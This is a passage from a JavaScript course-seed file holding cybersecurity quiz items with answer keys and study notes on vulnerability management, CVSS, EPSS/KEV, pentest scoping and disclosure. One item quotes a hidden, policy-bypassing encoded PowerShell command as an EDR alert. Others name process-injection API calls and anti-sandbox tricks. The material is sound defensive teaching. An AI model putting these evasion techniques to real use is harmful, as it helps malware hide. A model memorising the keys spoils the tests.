      { id: "b", text: "ascii" },
      { id: "c", text: "nocase" },
      { id: "d", text: "fullword" }
    ],
    answer: ["a"],
    explanation: "The `wide` modifier instructs YARA to match 2-byte wide-character (UTF-16) string representations.",
    noteRef: "sec-08-lo05",
    reviewed: false
  },

  // LO06
  {
    loId: "sec-08-lo06",
    type: "single",
    difficulty: 1,
    id: "sec-08-q21",
    stem: "What are the four core vertices in the Diamond Model of Intrusion Analysis?",
    options: [
      { id: "a", text: "Adversary, Capability, Infrastructure, and Victim" },
      { id: "b", text: "Confidentiality, Integrity, Availability, and Authentication" },
      { id: "c", text: "Reconnaissance, Weaponization, Delivery, and Exploitation" },
      { id: "d", text: "Source, Destination, Port, and Protocol" }
    ],
    answer: ["a"],
    explanation: "The Diamond Model establishes relationships between the Adversary, Capability, Infrastructure, and Victim.",
    noteRef: "sec-08-lo06",
    reviewed: false
  },
  {
    loId: "sec-08-lo06",
    type: "scenario",
    difficulty: 2,
    id: "sec-08-q22",
    stem: "In MITRE ATT&CK, an adversary executes PowerShell scripts to maintain persistence on a host. In ATT&CK taxonomy, what is 'Persistence' versus 'PowerShell'?",
    options: [
      { id: "a", text: "Persistence is the Tactic (the objective), while PowerShell execution is the Technique (the method)." },
      { id: "b", text: "PowerShell is the Tactic, while Persistence is the Technique." },
      { id: "c", text: "Both are classified as Procedure indicators." },
      { id: "d", text: "Neither is recognized in MITRE ATT&CK." }
    ],
    answer: ["a"],
    explanation: "Tactics represent adversary tactical goals (the 'why'); Techniques represent the technical mechanism (the 'how').",
    noteRef: "sec-08-lo06",
    reviewed: false
  },
  {
    loId: "sec-08-lo06",
    type: "single",
    difficulty: 2,
    id: "sec-08-q23",
    stem: "What phase of the Lockheed Martin Cyber Kill Chain describes the adversary establishing persistent communication back to their external command-and-control server?",
    options: [
      { id: "a", text: "Command and Control (C2)" },
      { id: "b", text: "Weaponization" },
      { id: "c", text: "Reconnaissance" },
      { id: "d", text: "Exploitation" }
    ],
    answer: ["a"],
    explanation: "The Command and Control phase opens a two-way channel allowing hands-on-keyboard remote control by the attacker.",
    noteRef: "sec-08-lo06",
    reviewed: false
  },
  {
    loId: "sec-08-lo06",
    type: "single",
    difficulty: 3,
    id: "sec-08-q24",
    stem: "How does the Diamond Model's 'Infrastructure' vertex differ from the 'Capability' vertex?",
    options: [
      { id: "a", text: "Infrastructure represents the communication pathways and servers used by the adversary (C2 domains, IP relays); Capability represents the tools, malware, and exploits employed." },
      { id: "b", text: "Infrastructure refers to the victim's computers; Capability refers to firewall speed." },
      { id: "c", text: "They are completely interchangeable terms." },
      { id: "d", text: "Infrastructure is only used for physical security audits." }
    ],
    answer: ["a"],
    explanation: "Infrastructure denotes C2 delivery networks/IPs; Capability denotes malware tools and exploit payloads.",
    noteRef: "sec-08-lo06",
    reviewed: false
  },

  // LO07
  {
    loId: "sec-08-lo07",
    type: "single",
    difficulty: 1,
    id: "sec-08-q25",
    stem: "What open standard provides a structured JSON data language for representing cyber threat intelligence objects?",
    options: [
      { id: "a", text: "STIX (Structured Threat Information Expression)" },
      { id: "b", text: "HTML5" },
      { id: "c", text: "SNMP" },
      { id: "d", text: "BGP" }
    ],
    answer: ["a"],
    explanation: "STIX 2.1 is the OASIS open standard format for structured CTI representation.",
    noteRef: "sec-08-lo07",
    reviewed: false
  },
  {
    loId: "sec-08-lo07",
    type: "scenario",
    difficulty: 2,
    id: "sec-08-q26",
    stem: "A SOC subscribes to an external threat feed using TAXII. What role does TAXII play in this integration?",
    options: [
      { id: "a", text: "It serves as the RESTful application-layer transport protocol over HTTPS to securely exchange STIX threat intelligence objects." },
      { id: "b", text: "It compiles C++ source code on client endpoints." },
      { id: "c", text: "It encrypts internal employee hard drives." },
      { id: "d", text: "It acts as a public dynamic DNS registrar." }
    ],
    answer: ["a"],
    explanation: "TAXII is the transport protocol specifically designed to transmit STIX intelligence messages.",
    noteRef: "sec-08-lo07",
    reviewed: false
  },
  {
    loId: "sec-08-lo07",
    type: "single",
    difficulty: 2,
    id: "sec-08-q27",
    stem: "In STIX 2.1 taxonomy, what object type represents a specific known threat group (e.g. APT28 or Lazarus)?",
    options: [
      { id: "a", text: "Threat Actor" },
      { id: "b", text: "Observed Data" },
      { id: "c", text: "Course of Action" },
      { id: "d", text: "Tool" }
    ],
    answer: ["a"],
    explanation: "In STIX, adversaries and hostile organizations are modeled as 'Threat Actor' objects.",
    noteRef: "sec-08-lo07",
    reviewed: false
  },
  {
    loId: "sec-08-lo07",
    type: "single",
    difficulty: 3,
    id: "sec-08-q28",
    stem: "What is the primary benefit of ingesting machine-readable STIX/TAXII threat feeds into an automated SIEM or SOAR platform?",
    options: [
      { id: "a", text: "Automated ingestion enables instantaneous threat detection rule updates and automated endpoint containment without manual analyst intervention." },
      { id: "b", text: "It reduces server cooling requirements." },
      { id: "c", text: "It eliminates the need for software patching." },
      { id: "d", text: "It replaces firewall ACLs with machine learning." }
    ],
    answer: ["a"],
    explanation: "Automated machine-readable feeds allow SIEMs and firewalls to update indicators and block threats programmatically in real time.",
    noteRef: "sec-08-lo07",
    reviewed: false
  },

  // LO08
  {
    loId: "sec-08-lo08",
    type: "single",
    difficulty: 1,
    id: "sec-08-q29",
    stem: "What memory manipulation technique involves an attacker injecting malicious shellcode into a legitimate running process to mask malicious activity?",
    options: [
      { id: "a", text: "Process Injection (or DLL Injection)" },
      { id: "b", text: "DNS Poisoning" },
      { id: "c", text: "ARP Spoofing" },
      { id: "d", text: "Cross-Site Scripting" }
    ],
    answer: ["a"],
    explanation: "Process injection writes malicious code into clean processes (like explorer.exe) to disguise network connections.",
    noteRef: "sec-08-lo08",
    reviewed: false
  },
  {
    loId: "sec-08-lo08",
    type: "scenario",
    difficulty: 2,
    id: "sec-08-q30",
    stem: "An EDR alert flags `powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand <base64>`. Why do attackers use `-WindowStyle Hidden`?",
    options: [
      { id: "a", text: "To prevent a visible PowerShell command prompt window from flashing on the victim's monitor and raising suspicion." },
      { id: "b", text: "To encrypt the PowerShell process in RAM." },
      { id: "c", text: "To bypass network firewall rules." },
      { id: "d", text: "To run the script at high priority." }
    ],
    answer: ["a"],
    explanation: "Hidden window parameters prevent the interactive terminal from alerting the logged-in victim.",
    noteRef: "sec-08-lo08",
    reviewed: false
  },
  {
    loId: "sec-08-lo08",
    type: "single",
    difficulty: 2,
    id: "sec-08-q31",
    stem: "What character encoding format is standard for Windows PowerShell `-EncodedCommand` Base64 arguments?",
    options: [
      { id: "a", text: "UTF-16LE (Little-Endian Unicode)" },
      { id: "b", text: "ASCII" },
      { id: "c", text: "UTF-8" },
      { id: "d", text: "ISO-8859-1" }
    ],
    answer: ["a"],
    explanation: "Windows PowerShell natively expects Base64 encoded commands in UTF-16LE formatting.",
    noteRef: "sec-08-lo08",
    reviewed: false
  },
  {
    loId: "sec-08-lo08",
    type: "single",
    difficulty: 3,
    id: "sec-08-q32",
    stem: "What Windows API function sequence is characteristic of classic remote process injection?",
    options: [
      { id: "a", text: "OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread" },
      { id: "b", text: "CreateFile -> ReadFile -> WriteFile -> CloseHandle" },
      { id: "c", text: "Socket -> Bind -> Listen -> Accept" },
      { id: "d", text: "RegOpenKey -> RegQueryValue -> RegCloseKey" }
    ],
    answer: ["a"],
    explanation: "Opening the process, allocating virtual memory, writing payload bytes, and creating a remote execution thread is the standard injection pattern.",
    noteRef: "sec-08-lo08",
    reviewed: false
  },

  // LO09 (Extension)
  {
    loId: "sec-08-lo09",
    type: "single",
    difficulty: 2,
    id: "sec-08-q33",
    stem: "Why does modern evasive malware call prolonged `Sleep()` functions (e.g. 24 hours) upon execution?",
    options: [
      { id: "a", text: "To exhaust automated sandbox analysis timeouts (typically 2 to 5 minutes) before dropping its malicious payload." },
      { id: "b", text: "To cool down the victim's computer CPU." },
      { id: "c", text: "To bypass router MTU packet limits." },
      { id: "d", text: "To wait for a full battery charge." }
    ],
    answer: ["a"],
    explanation: "Automated sandboxes only observe samples for several minutes; sleep delays cause them to classify the sample as benign.",
    noteRef: "sec-08-lo09",
    reviewed: false
  },
  {
    loId: "sec-08-lo09",
    type: "scenario",
    difficulty: 3,
    id: "sec-08-q34",
    stem: "A suspicious binary queries the system and checks for the existence of virtual files like `VBoxGuestAdditions.sys` and checks if CPU core count is less than 2. What is this behavior?",
    options: [
      { id: "a", text: "Anti-Virtual Machine (Anti-VM) sandbox evasion" },
      { id: "b", text: "Software Composition Analysis" },
      { id: "c", text: "DNS zone transfer" },
      { id: "d", text: "SQL injection" }
    ],
    answer: ["a"],
    explanation: "Checking for hypervisor guest tools or minimal hardware allocations is a classic technique to detect and evade virtual sandboxes.",
    noteRef: "sec-08-lo09",
    reviewed: false
  }
];

balanceAndSave('cybersecurity', 'malware-phishing-and-threat-intel', ch08Objectives, ch08Questions);

// ============================================================================
// CHAPTER 9: vulnerability-assessment-and-lab-pentesting (sec-09)
// ============================================================================
const ch09Objectives = {
  version: 1,
  chapterId: "sec-09",
  objectives: [
    {
      id: "sec-09-lo01",
      order: 1,
      title: "Explain the vulnerability management lifecycle and scanning workflows",
      bloom: "understand",
      tier: "core",
      mustHave: true,
      keywords: ["vulnerability management", "discovery", "prioritization", "remediation", "verification"],
      aliases: ["vulnerability lifecycle", "vuln management process"],
      prerequisites: ["sec-01-lo01"],
      estMinutes: 10
    },
    {
      id: "sec-09-lo02",
      order: 2,
      title: "Calculate Common Vulnerability Scoring System (CVSS v3.1) base metric vectors",
      bloom: "calculate",
      tier: "core",
      mustHave: true,
      keywords: ["cvss v3.1", "base score", "attack vector", "impact metrics", "exploitability"],
      aliases: ["cvss scoring", "vulnerability severity"],
      prerequisites: ["sec-09-lo01"],
      estMinutes: 14
    },
    {
      id: "sec-09-lo03",
      order: 3,
      title: "Prioritize vulnerability remediation using exploitability metrics (EPSS, KEV)",
      bloom: "prioritize",
      tier: "core",
      mustHave: true,
      keywords: ["epss", "cisa kev", "exploit prediction", "vulnerability prioritization"],
      aliases: ["remediation prioritization", "known exploited vulnerabilities"],
      prerequisites: ["sec-09-lo02"],
      estMinutes: 12
    },
    {
      id: "sec-09-lo04",
      order: 4,
      title: "Compare credentialed and non-credentialed vulnerability scans (Nessus, OpenVAS)",
      bloom: "compare",
      tier: "core",
      mustHave: false,
      keywords: ["credentialed scan", "non-credentialed scan", "nessus", "openvas"],
      aliases: ["authenticated scanning", "vulnerability assessment tools"],
      prerequisites: ["sec-09-lo01"],
      estMinutes: 12
    },
    {
      id: "sec-09-lo05",
      order: 5,
      title: "Structure ethical penetration testing phases: Reconnaissance, Scanning, Exploitation, Reporting",
      bloom: "structure",
      tier: "core",
      mustHave: true,
      keywords: ["pentest phases", "reconnaissance", "scanning", "exploitation", "post-exploitation"],
      aliases: ["ethical hacking phases", "pentesting lifecycle"],
      prerequisites: ["sec-01-lo01"],
      estMinutes: 12
    },
    {
      id: "sec-09-lo06",
      order: 6,
      title: "Define legal boundaries, Rules of Engagement (RoE), and authorization contracts",
      bloom: "define",
      tier: "core",
      mustHave: false,
      keywords: ["rules of engagement", "cfaa", "authorization letter", "scope boundaries"],
      aliases: ["roe", "legal authorization in pentesting"],
      prerequisites: ["sec-09-lo05"],
      estMinutes: 10
    },
    {
      id: "sec-09-lo07",
      order: 7,
      title: "Conduct passive and active reconnaissance in controlled lab environments",
      bloom: "conduct",
      tier: "core",
      mustHave: false,
      keywords: ["reconnaissance", "osint", "nmap", "shodan", "banner grabbing"],
      aliases: ["footprinting", "lab reconnaissance"],
      prerequisites: ["sec-02-lo06"],
      estMinutes: 12
    },
    {
      id: "sec-09-lo08",
      order: 8,
      title: "Formulate comprehensive technical vulnerability and remediation reports",
      bloom: "formulate",
      tier: "core",
      mustHave: false,
      keywords: ["pentest report", "executive summary", "remediation guidance", "technical findings"],
      aliases: ["security assessment reporting", "remediation roadmap"],
      prerequisites: ["sec-09-lo05"],
      estMinutes: 12
    },
    {
      id: "sec-09-lo09",
      order: 9,
      title: "Apply Coordinated Vulnerability Disclosure (CVD) and bug bounty standards",
      bloom: "apply",
      tier: "extension",
      mustHave: false,
      keywords: ["cvd", "coordinated disclosure", "bug bounty", "safe harbor"],
      aliases: ["responsible disclosure", "vulnerability reporting policy"],
      prerequisites: ["sec-09-lo06"],
      estMinutes: 12
    }
  ]
};

// Notes for sec-09
writeNoteBlock('cybersecurity', 'vulnerability-assessment-and-lab-pentesting', 'sec-09-lo01',
  `Vulnerability management is an ongoing proactive operational program:
1. Discover & Inventory: Continuously identify all hardware, software, cloud assets, and services across the enterprise perimeter and internal subnets.
2. Assess: Execute automated vulnerability scans using engines like Nessus, OpenVAS, or Qualys to identify missing patches, obsolete protocols, and known CVEs.
3. Prioritize: Contextualize vulnerabilities based on asset criticality, network exposure, and real-world exploit availability.
4. Remediate: Apply patches, reconfigure security controls, or implement mitigating workarounds.
5. Verify: Re-scan assets to confirm successful remediation and ensure no regression.`,
  `Tracking vulnerability management stages programmatically:
\`\`\`python
vuln_lifecycle = [
    {"stage": 1, "name": "Asset Discovery", "tool": "Nmap / Network inventory"},
    {"stage": 2, "name": "Vulnerability Assessment", "tool": "Nessus / OpenVAS"},
    {"stage": 3, "name": "Risk Prioritization", "tool": "EPSS / CISA KEV"},
    {"stage": 4, "name": "Patch Remediation", "tool": "Ansible / WSUS"},
    {"stage": 5, "name": "Rescan Verification", "tool": "Targeted vulnerability scan"}
]

for step in vuln_lifecycle:
    print(f"Phase {step['stage']}: {step['name']} ({step['tool']})")
\`\`\``,
  `Treating vulnerability management as a periodic annual checklist rather than a continuous cycle. Thousands of new CVEs are published monthly; monthly or continuous scanning is required to prevent exposure to newly discovered zero-day and n-day vulnerabilities.`,
  `What is the final phase of the vulnerability management lifecycle to confirm a patch was applied successfully? Rescan Verification.`
);

writeNoteBlock('cybersecurity', 'vulnerability-assessment-and-lab-pentesting', 'sec-09-lo02',
  `The Common Vulnerability Scoring System (CVSS v3.1) provides an open standardized framework for rating cybersecurity vulnerability severity. The Base Score (0.0 to 10.0) combines Exploitability Metrics and Impact Metrics:
- Attack Vector (AV): Network (N), Adjacent (A), Local (L), Physical (P).
- Attack Complexity (AC): Low (L), High (H).
- Privileges Required (PR): None (N), Low (L), High (H).
- User Interaction (UI): None (N), Required (R).
- Scope (S): Unchanged (U), Changed (C).
- Impact: Confidentiality (C), Integrity (I), Availability (A) rated None, Low, or High.
Ratings are categorized as: Low (0.1–3.9), Medium (4.0–6.9), High (7.0–8.9), and Critical (9.0–10.0).`,
  `Parsing a CVSS v3.1 vector string:
\`\`\`python
# Vector for a critical unauthenticated remote code execution flaw:
cvss_vector = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"

metrics = dict(m.split(":") for m in cvss_vector.split("/")[1:])
print("Attack Vector:", metrics["AV"])       # N (Network)
print("Privileges Required:", metrics["PR"]) # N (None)
print("Confidentiality Impact:", metrics["C"]) # H (High)
# Combined metric yields CVSS Base Score: 9.8 (Critical)
\`\`\``,
  `Equating high CVSS Base Scores directly with immediate operational risk. A CVSS 9.8 vulnerability on an isolated internal test server with no active exploit in the wild poses vastly less real-world risk than a CVSS 7.5 vulnerability exposed to the internet with an active public exploit kit.`,
  `What CVSS v3.1 score threshold marks the boundary for a 'Critical' severity rating? 9.0 to 10.0.`
);

writeNoteBlock('cybersecurity', 'vulnerability-assessment-and-lab-pentesting', 'sec-09-lo03',
  `Modern vulnerability management enhances raw CVSS base scores with dynamic real-world exploitability metrics:
1. EPSS (Exploit Prediction Scoring System): A data-driven model (0.0 to 1.0 / 0% to 100%) that estimates the mathematical probability that a software vulnerability will be exploited in the wild in the next 30 days.
2. CISA KEV (Known Exploited Vulnerabilities Catalog): The authoritative catalog of CVEs confirmed to have been weaponized and actively exploited in real-world attacks. Vulnerabilities in CISA KEV represent imminent active risk and demand expedited emergency patching.`,
  `Prioritizing remediation using EPSS and CISA KEV data:
\`\`\`python
vulnerabilities = [
    {"cve": "CVE-2026-1001", "cvss": 9.8, "in_kev": False, "epss": 0.02}, # High CVSS, but low active exploit likelihood
    {"cve": "CVE-2026-2002", "cvss": 7.5, "in_kev": True,  "epss": 0.88}  # Moderate CVSS, but actively exploited in wild!
]

def triage_vulnerability(v):
    if v["in_kev"] or v["epss"] > 0.5:
        return f"EMERGENCY REMEDIATION: {v['cve']} is actively exploited or high EPSS probability"
    return f"STANDARD REMEDIATION: {v['cve']} schedule for routine patch cycle"

for v in vulnerabilities:
    print(triage_vulnerability(v))
\`\`\``,
  `Prioritizing patches strictly by highest CVSS score while ignoring CISA KEV. Remediation teams waste limited resources patching obscure CVSS 9.0+ bugs that have zero public exploits, leaving lower-scoring actively exploited vulnerabilities unpatched.`,
  `What CISA registry lists vulnerabilities that are confirmed to be under active, in-the-wild exploitation by adversaries? CISA Known Exploited Vulnerabilities (KEV) Catalog.`
);

writeNoteBlock('cybersecurity', 'vulnerability-assessment-and-lab-pentesting', 'sec-09-lo04',
  `Vulnerability scanning engines (such as Tenable Nessus, OpenVAS/Greenbone) operate in two primary modes:
1. Non-Credentialed (Unauthenticated) Scans: The scanner probes external ports over the network without host credentials. It identifies open ports, banners, and unpatched network services visible from an external attacker's perspective. It cannot inspect local software packages or internal configuration settings.
2. Credentialed (Authenticated) Scans: The scanner logs into the target host using SSH or Windows administrative credentials. It queries local package managers, registry entries, software versions, and security configurations with zero network packet fuzzing, delivering high fidelity and drastically lower false-positive rates.`,
  `Contrasting scan findings across authenticated vs unauthenticated assessments:
\`\`\`python
scan_capabilities = {
    "Non-Credentialed": [
        "Open listening ports and service banners",
        "Perimeter firewall rule verification",
        "External web server version disclosure"
    ],
    "Credentialed": [
        "Installed software packages and exact build versions",
        "Local OS patch levels and missing security KBs",
        "Host registry keys, local user accounts, and password policies"
    ]
}

print("Credentialed Assessment Scope:\n-", "\n- ".join(scan_capabilities["Credentialed"]))
\`\`\``,
  `Relying solely on non-credentialed scans for compliance audits. Unauthenticated scans only see network listeners; they completely miss unpatched local desktop applications (like vulnerable web browsers or PDF viewers) that do not listen on open network ports.`,
  `Which vulnerability scan mode logs directly into target hosts using valid administrative credentials to audit local software and registry keys? Credentialed (Authenticated) Scan.`
);

writeNoteBlock('cybersecurity', 'vulnerability-assessment-and-lab-pentesting', 'sec-09-lo05',
  `Ethical penetration testing follows a structured methodology simulating adversarial attack vectors in authorized laboratory environments:
1. Reconnaissance (OSINT & Footprinting): Gathering intelligence on target infrastructure, domain names, public IP blocks, and employee email formats.
2. Scanning & Enumeration: Identifying live hosts, open service ports, and running versions using tools like Nmap.
3. Vulnerability Analysis: Assessing discovered services for known security flaws and configuration weaknesses.
4. Exploitation: Validating vulnerabilities through controlled proof-of-concept execution in authorized lab environments.
5. Post-Exploitation & Reporting: Documenting findings, calculating business impact, and providing actionable remediation roadmaps.`,
  `Structuring pentesting execution stages in a controlled lab:
\`\`\`python
pentest_phases = [
    "1. Scope Definition & Rules of Engagement Signing",
    "2. Passive & Active Reconnaissance",
    "3. Port Scanning & Service Enumeration",
    "4. Vulnerability Assessment & Flaw Identification",
    "5. Controlled Lab Exploitation & Impact Demonstration",
    "6. Remediation Reporting & Executive Briefing"
]

for p in pentest_phases:
    print("Stage:", p)
\`\`\``,
  `Attempting exploitation before completing thorough enumeration. Rushing into automated exploit execution without understanding service architectures leads to failed attacks, noisy detection alerts, or accidental server crashes.`,
  `What is the foundational first phase of an ethical penetration test where information is gathered about the target? Reconnaissance.`
);

writeNoteBlock('cybersecurity', 'vulnerability-assessment-and-lab-pentesting', 'sec-09-lo06',
  `The boundary between ethical penetration testing and illegal cybercrime is governed by explicit legal authorization. In the United States, unauthorized access violates the Computer Fraud and Abuse Act (CFAA, 18 U.S.C. 1030). Before conducting any testing:
1. Written Authorization: A formal signed contract (Letter of Authorization / Permission to Test) signed by authorized corporate stakeholders holding ownership of the targeted assets.
2. Rules of Engagement (RoE): Specifies exact IP address ranges, allowed testing timeframes, emergency stop procedures, excluded critical systems, and permissible exploitation techniques (e.g., forbidding Denial of Service).`,
  `Simulating scope verification against authorized Rules of Engagement:
\`\`\`python
authorized_scope = {"192.168.10.0/24", "10.50.0.0/16"}
out_of_scope_assets = {"192.168.10.1", "10.50.0.5"} # Production domain controllers excluded

def verify_target_allowed(target_ip):
    if target_ip in out_of_scope_assets:
        return "CRITICAL STOP: Target is explicitly excluded in Rules of Engagement!"
    return "TARGET VERIFIED: Within authorized testing scope."

print(verify_target_allowed("192.168.10.1"))  # STOP
print(verify_target_allowed("192.168.10.45")) # Allowed
\`\`\``,
  `Testing systems hosted on multi-tenant public cloud infrastructure without verifying cloud provider testing policies. Scanning third-party infrastructure without permission violates cloud terms of service and federal statutes.`,
  `What legal document explicitly defines allowed IP ranges, testing windows, and testing constraints before a penetration test begins? Rules of Engagement (RoE).`
);

writeNoteBlock('cybersecurity', 'vulnerability-assessment-and-lab-pentesting', 'sec-09-lo07',
  `Reconnaissance is divided into two operational modes:
1. Passive Reconnaissance: Gathering intelligence without sending direct network packets to the target's systems. Techniques include reviewing DNS records, WHOIS data, public code repositories (GitHub leaks), certificate transparency logs, and search engines (Google dorking, Shodan).
2. Active Reconnaissance: Direct interaction with the target systems to map ports and services. In authorized lab environments, Nmap scans probe network ports using SYN stealth scans (nmap -sS), service version detection (nmap -sV), and default script auditing (nmap -sC).`,
  `Parsing Nmap service scan output telemetry:
\`\`\`python
# Sample parsed nmap output: nmap -sV -p 22,80,445 10.0.1.15
nmap_findings = [
    {"port": 22, "state": "open", "service": "ssh", "version": "OpenSSH 8.9p1 Ubuntu"},
    {"port": 80, "state": "open", "service": "http", "version": "Apache httpd 2.4.52"},
    {"port": 445, "state": "open", "service": "netbios-ssn", "version": "Samba 4.15.13"}
]

for finding in nmap_findings:
    print(f"Port {finding['port']}/tcp: {finding['service']} -> {finding['version']}")
\`\`\``,
  `Performing active Nmap port scanning against unauthorized third-party IP addresses. Active network probes transmit packets directly to the destination and are logged by perimeter IDS/IPS systems, potentially triggering legal or law enforcement action without authorization.`,
  `Which reconnaissance mode gathers intelligence using public sources (OSINT, DNS, WHOIS) without sending packets directly to the target network? Passive Reconnaissance.`
);

writeNoteBlock('cybersecurity', 'vulnerability-assessment-and-lab-pentesting', 'sec-09-lo08',
  `A professional penetration test report translates technical findings into actionable remediation guidance for diverse audiences:
1. Executive Summary: High-level overview written for business leadership and executives, detailing overall security posture, business risks, and strategic resource allocation recommendations.
2. Technical Findings: Detailed entries per vulnerability including Title, Severity (CVSS score), Affected Assets/URLs, Step-by-Step Proof of Concept (PoC) Reproduction, Root Cause Analysis, and Exact Technical Remediation Guidance.
3. Remediation Roadmap: Prioritized action items ranked by risk and effort.`,
  `Structuring a professional vulnerability report entry:
\`\`\`python
vulnerability_finding = {
    "id": "FINDING-01",
    "title": "SQL Injection in Customer Search Endpoint",
    "severity": "High (CVSS 8.5)",
    "affected_component": "POST /api/v1/customers/search",
    "business_risk": "Unauthorized access to complete customer personal database",
    "remediation": "Replace dynamic SQL string concatenation with parameterized prepared statements using PDO."
}

print("Report Title:", vulnerability_finding["title"])
print("Severity:", vulnerability_finding["severity"])
print("Remediation Guidance:", vulnerability_finding["remediation"])
\`\`\``,
  `Delivering a penetration testing report that only outputs automated tool scan logs without manual validation, business context, or tailored remediation guidance. Automated tools produce false positives; professional reporting requires human verification and context.`,
  `What section of a penetration testing report summarizes technical risks in business language suitable for non-technical executive leadership? The Executive Summary.`
);

writeNoteBlock('cybersecurity', 'vulnerability-assessment-and-lab-pentesting', 'sec-09-lo09',
  `Coordinated Vulnerability Disclosure (CVD, ISO/IEC 29147) provides an ethical framework for security researchers to report vulnerabilities to software vendors, giving them a reasonable timeframe (typically 90 days) to release patches before public disclosure. Modern enterprises operate Vulnerability Disclosure Policies (VDP) and Bug Bounty programs (via platforms like HackerOne or Bugcrowd) offering legal safe harbor and financial bounties to researchers who report flaws responsibly within designated scope.`,
  `Evaluating standard Coordinated Vulnerability Disclosure (CVD) timelines:
\`\`\`python
# Standard industry 90-day responsible disclosure timeline
import datetime

report_date = datetime.date(2026, 2, 1)
disclosure_window_days = 90
public_disclosure_deadline = report_date + datetime.timedelta(days=disclosure_window_days)

print("Vulnerability Reported:", report_date)
print("Standard 90-Day Coordinated Patch Deadline:", public_disclosure_deadline)
\`\`\``,
  `Publicly publishing a zero-day exploit immediately on social media ('full disclosure') without giving the software vendor an opportunity to develop and deploy a security fix, placing millions of innocent users at immediate risk.`,
  `What standard industry timeframe (in days) is commonly granted to software vendors to patch vulnerabilities under Coordinated Vulnerability Disclosure guidelines? 90 days.`
);

// Questions for sec-09
const ch09Questions = [
  // LO01
  {
    loId: "sec-09-lo01",
    type: "single",
    difficulty: 1,
    id: "sec-09-q01",
    stem: "What is the primary objective of a vulnerability management program?",
    options: [
      { id: "a", text: "Continuously identifying, prioritizing, remediating, and verifying software vulnerabilities across organizational assets." },
      { id: "b", text: "Writing custom zero-day exploits to attack external competitors." },
      { id: "c", text: "Replacing all computer monitors every 6 months." },
      { id: "d", text: "Deleting database backups to save storage." }
    ],
    answer: ["a"],
    explanation: "Vulnerability management is an ongoing lifecycle of discovering, prioritizing, patching, and verifying security flaws.",
    noteRef: "sec-09-lo01",
    reviewed: false
  },
  {
    loId: "sec-09-lo01",
    type: "scenario",
    difficulty: 2,
    id: "sec-09-q02",
    stem: "A company runs automated vulnerability scans monthly. After patching discovered issues, what mandatory step verifies that the patches successfully resolved the flaws without regressions?",
    options: [
      { id: "a", text: "Rescan Verification" },
      { id: "b", text: "Passive Reconnaissance" },
      { id: "c", text: "Phishing Simulation" },
      { id: "d", text: "Hard Drive Reformatting" }
    ],
    answer: ["a"],
    explanation: "Rescanning verifies that the remediation was effective and that the vulnerability is closed.",
    noteRef: "sec-09-lo01",
    reviewed: false
  },
  {
    loId: "sec-09-lo01",
    type: "multi",
    difficulty: 2,
    id: "sec-09-q03",
    stem: "Which of the following stages are part of the standard vulnerability management lifecycle?",
    options: [
      { id: "a", text: "Asset Discovery and Inventory" },
      { id: "b", text: "Vulnerability Assessment / Scanning" },
      { id: "c", text: "Remediation and Patching" },
      { id: "d", text: "Ransom Payment Negotiation" }
    ],
    answer: ["a", "b", "c"],
    explanation: "Discovery, assessment, and remediation are core stages. Ransom payment is an incident response anti-pattern.",
    noteRef: "sec-09-lo01",
    reviewed: false
  },
  {
    loId: "sec-09-lo01",
    type: "single",
    difficulty: 3,
    id: "sec-09-q04",
    stem: "Why does an incomplete or inaccurate IT asset inventory severely undermine vulnerability management?",
    options: [
      { id: "a", text: "You cannot protect or patch what you do not know exists; unmanaged shadow IT assets become unmonitored attack entry points." },
      { id: "b", text: "Vulnerability scanners refuse to run without a complete inventory." },
      { id: "c", text: "It causes network cables to fail." },
      { id: "d", text: "It invalidates TLS 1.3 certificates." }
    ],
    answer: ["a"],
    explanation: "Shadow IT and unmanaged assets remain unpatched and provide adversaries with blind-spot ingress points.",
    noteRef: "sec-09-lo01",
    reviewed: false
  },

  // LO02
  {
    loId: "sec-09-lo02",
    type: "single",
    difficulty: 1,
    id: "sec-09-q05",
    stem: "What is the maximum possible Base Score under the Common Vulnerability Scoring System (CVSS v3.1)?",
    options: [
      { id: "a", text: "10.0" },
      { id: "b", text: "100.0" },
      { id: "c", text: "5.0" },
      { id: "d", text: "1.0" }
    ],
    answer: ["a"],
    explanation: "CVSS v3.1 base scores range from 0.0 (None) to 10.0 (Critical).",
    noteRef: "sec-09-lo02",
    reviewed: false
  },
  {
    loId: "sec-09-lo02",
    type: "numeric",
    difficulty: 2,
    id: "sec-09-q06",
    stem: "A vulnerability has a CVSS v3.1 Base Score of 9.8. Under CVSS qualitative severity ratings, what minimum score defines the 'Critical' category?",
    options: [
      { id: "a", text: "9.0" },
      { id: "b", text: "7.0" },
      { id: "c", text: "8.0" },
      { id: "d", text: "10.0" }
    ],
    answer: ["a"],
    explanation: "CVSS v3.1 rates scores from 9.0 to 10.0 as Critical.",
    noteRef: "sec-09-lo02",
    verify: "(9.0 === 9.0)",
    reviewed: false
  },
  {
    loId: "sec-09-lo02",
    type: "scenario",
    difficulty: 2,
    id: "sec-09-q07",
    stem: "In CVSS v3.1 metrics, a vulnerability can be exploited by an unauthenticated attacker across the public internet without user interaction. What are the values for AV, PR, and UI?",
    options: [
      { id: "a", text: "AV:N (Network), PR:N (None), UI:N (None)" },
      { id: "b", text: "AV:L (Local), PR:H (High), UI:R (Required)" },
      { id: "c", text: "AV:P (Physical), PR:N (None), UI:N (None)" },
      { id: "d", text: "AV:A (Adjacent), PR:L (Low), UI:R (Required)" }
    ],
    answer: ["a"],
    explanation: "Remote network exploitation without credentials or user action maps to AV:N, PR:N, and UI:N.",
    noteRef: "sec-09-lo02",
    reviewed: false
  },
  {
    loId: "sec-09-lo02",
    type: "single",
    difficulty: 3,
    id: "sec-09-q08",
    stem: "In CVSS v3.1, what does the Scope metric (S:U vs S:C) signify?",
    options: [
      { id: "a", text: "Whether a vulnerability in one component impacts resources managed by a different authority or security boundary (Scope Changed, S:C)." },
      { id: "b", text: "Whether the software was written in C or Python." },
      { id: "c", text: "Whether the operating system is 32-bit or 64-bit." },
      { id: "d", text: "Whether the scanner was credentialed or non-credentialed." }
    ],
    answer: ["a"],
    explanation: "A Scope change (e.g. escaping a virtual machine to compromise the host hypervisor) increases severity.",
    noteRef: "sec-09-lo02",
    reviewed: false
  },

  // LO03
  {
    loId: "sec-09-lo03",
    type: "single",
    difficulty: 1,
    id: "sec-09-q09",
    stem: "What probability does the Exploit Prediction Scoring System (EPSS) estimate?",
    options: [
      { id: "a", text: "The probability that a software vulnerability will be exploited in the wild within the next 30 days." },
